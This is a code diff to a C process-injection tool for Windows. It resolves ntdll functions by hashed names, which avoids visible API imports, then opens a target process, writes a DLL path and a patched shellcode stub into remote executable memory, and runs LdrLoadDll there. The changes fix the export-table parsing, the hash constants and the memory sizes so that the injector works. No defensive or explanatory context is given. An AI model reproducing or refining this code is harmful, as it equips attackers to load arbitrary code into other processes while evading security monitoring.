@@ -1,4 +1,4 @@
-#include<injection.h>
+#include"injection.h"
 
 // Hash function
 DWORD HashStringA_Djb2(const char* str){
@@ -32,8 +32,8 @@ PVOID GetNtDllBaseAddress(){
 }
 
 // Resolve API by hash
-PVOID GetProcAddress(HMODULE hModule, DWORD dwTargetHash) {
-    PBYTE pBase = (PBYTE)GetNtDllBaseAddress();
+PVOID GetProcAddressByHash(HMODULE hModule, DWORD dwTargetHash) {
+    PBYTE pBase = (PBYTE)hModule;
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
     if(pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
 
@@ -44,7 +44,7 @@ PVOID GetProcAddress(HMODULE hModule, DWORD dwTargetHash) {
     if (exportDir.VirtualAddress == 0) return NULL;
 
     PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDir.VirtualAddress);
-    PWORD pdwNames = (PWORD)(pBase + pExportDir->AddressOfNames);
+    PDWORD pdwNames = (PDWORD)(pBase + pExportDir->AddressOfNames);
     PWORD pwOrdinals = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);
     PDWORD pdwFunctions = (PDWORD)(pBase + pExportDir->AddressOfFunctions);
 
@@ -85,7 +85,7 @@ unsigned char shellcode[] = {
     0xC3
 };
 
-BOOL Injection(_In_ CONST HANDLE PID, _In_ LPCWSTR DLLPath, _In_ CONST SIZE_T PathSize){
+BOOL Injection(_In_ CONST DWORD PID, _In_ LPCWSTR DLLPath, _In_ SIZE_T CONST PathSize){
     NTSTATUS status =  0;
     SIZE_T bytewritten = 0;
     HANDLE hProcess = NULL;
@@ -96,19 +96,20 @@ BOOL Injection(_In_ CONST HANDLE PID, _In_ LPCWSTR DLLPath, _In_ CONST SIZE_T Pa
     PVOID pRemoteShellcode = NULL;
     _OBJECT_ATTRIBUTES objattr = { sizeof(objattr) , NULL, NULL, 0, NULL, NULL };
     _CLIENT_ID clientid = { (HANDLE)(ULONG_PTR)PID, NULL };
+    SIZE_T _PathSize = PathSize;
 
 // Resolve NTAPI functions by hash
     HMODULE hNtdll = GetNtDllBaseAddress();
-    fn_NtOpenProcess pNtOpenProcess = (fn_NtOpenProcess)GetProcAddressByHash(hNtdll, 0x31059255); // "ntopenprocess"
-    fn_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddressByHash(hNtdll, 0xc66d2fcc); // "ntallocatevirtualmemory"
-    fn_NtWriteVirtualMemory pNtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddressByHash(hNtdll, 0x25801e7a); // "ntwritevirtualmemory"
-    fn_NtCreateThreadEx pNtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddressByHash(hNtdll, 0x81731111); // "ntcreatethreadex"
-    fn_NtWaitForSingleObject pNtWaitForSingleObject = (fn_NtWaitForSingleObject)GetProcAddressByHash(hNtdll, 0x6e7c8b5d); // "ntwaitforsingleobject"
-    fn_NtClose pNtClose = (fn_NtClose)GetProcAddressByHash(hNtdll, 0x31c2e16a); // "ntclose"
-    fn_NtFreeVirtualMemory pNtFreeVirtualMemory = (fn_NtFreeVirtualMemory)GetProcAddressByHash(hNtdll, 0x0c6a2f1b); // "ntfreevirtualmemory"
-    fn_LdrLoadDll pLdrLoadDll = (fn_LdrLoadDll)GetProcAddressByHash(hNtdll, 0x329156f3); // "ldrloaddll"
+    fn_NtOpenProcess pNtOpenProcess = (fn_NtOpenProcess)GetProcAddressByHash(hNtdll, 0x86C330B8); // "ntopenprocess"
+    fn_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddressByHash(hNtdll, 0xC66D2FCC); // "ntallocatevirtualmemory"
+    fn_NtWriteVirtualMemory pNtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddressByHash(hNtdll, 0x1423FC12); // "ntwritevirtualmemory"
+    fn_NtCreateThreadEx pNtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddressByHash(hNtdll, 0x41F2B1B0); // "ntcreatethreadex"
+    fn_NtWaitForSingleObject pNtWaitForSingleObject = (fn_NtWaitForSingleObject)GetProcAddressByHash(hNtdll, 0x5B5856DC); // "ntwaitforsingleobject"
+    fn_NtClose pNtClose = (fn_NtClose)GetProcAddressByHash(hNtdll, 0x2D18BB7D); // "ntclose"
+    fn_NtFreeVirtualMemory pNtFreeVirtualMemory = (fn_NtFreeVirtualMemory)GetProcAddressByHash(hNtdll, 0xF429F469); // "ntfreevirtualmemory"
+    fn_LdrLoadDll pLdrLoadDll = (fn_LdrLoadDll)GetProcAddressByHash(hNtdll, 0x23A21F83); // "ldrloaddll"
 
-    if (!pNtOpenProcess || !pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtCreateThreadEx || !pLdrLoadDll) {
+    if (!pNtOpenProcess || !pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtCreateThreadEx || !pLdrLoadDll || !pNtWaitForSingleObject || !pNtClose || !pNtFreeVirtualMemory) {
         return FALSE;
     }
 
@@ -117,7 +118,7 @@ BOOL Injection(_In_ CONST HANDLE PID, _In_ LPCWSTR DLLPath, _In_ CONST SIZE_T Pa
     if (status != STATUS_SUCCESS || !hProcess) goto CLEAN_UP;
 
 // NtAllocateVirtualMemory (for DLL Path)
-    status = pNtAllocateVirtualMemory(hProcess, &pRemoteDllPath, 0, &PathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    status = pNtAllocateVirtualMemory(hProcess, &pRemoteDllPath, 0, &_PathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != STATUS_SUCCESS) goto CLEAN_UP;
 
 // NtWriteVirtualMemory (Write DLL Path)
@@ -139,7 +140,7 @@ BOOL Injection(_In_ CONST HANDLE PID, _In_ LPCWSTR DLLPath, _In_ CONST SIZE_T Pa
 
 // Allocate memory for LdrLoadDll to write output of DllHandle
     SIZE_T handle_size = sizeof(PVOID);
-    status = pNtAllocateVirtualMemory(hProcess, &pRemoteDllHandle, 0, &PathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    status = pNtAllocateVirtualMemory(hProcess, &pRemoteDllHandle, 0, &handle_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != STATUS_SUCCESS) goto CLEAN_UP;
 
 // Path shellcode stub with dynamic addresses
@@ -151,7 +152,8 @@ BOOL Injection(_In_ CONST HANDLE PID, _In_ LPCWSTR DLLPath, _In_ CONST SIZE_T Pa
     *(PVOID*)(shellcode + 28) = pLdrLoadDll;
 
 // Write patched shellcode to remote memory
-    status = pNtAllocateVirtualMemory(hProcess, &pRemoteShellcode, 0, &PathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    SIZE_T shellcode_size = sizeof(shellcode);
+    status = pNtAllocateVirtualMemory(hProcess, &pRemoteShellcode, 0, &shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (status != STATUS_SUCCESS) goto CLEAN_UP;
 
     status = pNtWriteVirtualMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &bytewritten);
